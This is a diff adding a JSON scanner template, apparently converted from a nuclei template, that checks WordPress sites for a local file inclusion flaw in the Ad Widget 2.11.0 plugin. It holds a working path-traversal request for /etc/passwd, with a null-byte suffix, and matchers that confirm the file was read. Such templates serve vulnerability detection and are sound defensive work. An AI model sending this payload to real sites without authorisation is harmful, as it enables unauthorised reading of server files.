@@ -1,0 +1,151 @@
+{
+  "id": "ad-widget-lfi",
+  "name": "WordPress Ad Widget 2.11.0 - Local File Inclusion",
+  "author": "0x_Akoko",
+  "severity": "HIGH",
+  "description": "WordPress Ad Widget 2.11.0 is vulnerable to local file inclusion. Exploiting this issue may allow an attacker to obtain sensitive information that could aid in further attacks.\n",
+  "references": [
+    "https://cxsecurity.com/issue/WLB-2017100084",
+    "https://plugins.trac.wordpress.org/changeset/1628751/ad-widget",
+    "https://wpscan.com/vulnerability/caca21fe-56bf-4d4c-afc8-4a218e52f0a2"
+  ],
+  "tags": [
+    "wordpress",
+    "wp-plugin",
+    "lfi",
+    "wp",
+    "adWidget",
+    "wpscan"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {},
+  "variablesType": "sniper",
+  "cweId": "CWE-22",
+  "cvssScore": "7.5",
+  "cvssMetrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}/wp-content/plugins/ad-widget/views/modal/?step\u003d../../../../../../../etc/passwd%00",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "REGEX",
+          "part": "body",
+          "values": [
+            "root:[x*]:0:0"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "internal": "true",
+          "group": 1
+        },
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "ad-widget-lfi",
+    "info": {
+      "name": "WordPress Ad Widget 2.11.0 - Local File Inclusion",
+      "author": "0x_Akoko",
+      "severity": "high",
+      "description": "WordPress Ad Widget 2.11.0 is vulnerable to local file inclusion. Exploiting this issue may allow an attacker to obtain sensitive information that could aid in further attacks.\n",
+      "reference": [
+        "https://cxsecurity.com/issue/WLB-2017100084",
+        "https://plugins.trac.wordpress.org/changeset/1628751/ad-widget",
+        "https://wpscan.com/vulnerability/caca21fe-56bf-4d4c-afc8-4a218e52f0a2"
+      ],
+      "classification": {
+        "cvss_metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+        "cvss_score": "7.5",
+        "cwe_id": "CWE-22"
+      },
+      "metadata": {
+        "max_request": 1
+      },
+      "tags": "wordpress,wp-plugin,lfi,wp,adWidget,wpscan"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}/wp-content/plugins/ad-widget/views/modal/?step\u003d../../../../../../../etc/passwd%00"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "regex",
+            "part": "body",
+            "regex": [
+              "root:[x*]:0:0"
+            ],
+            "group": 1,
+            "internal": true
+          },
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
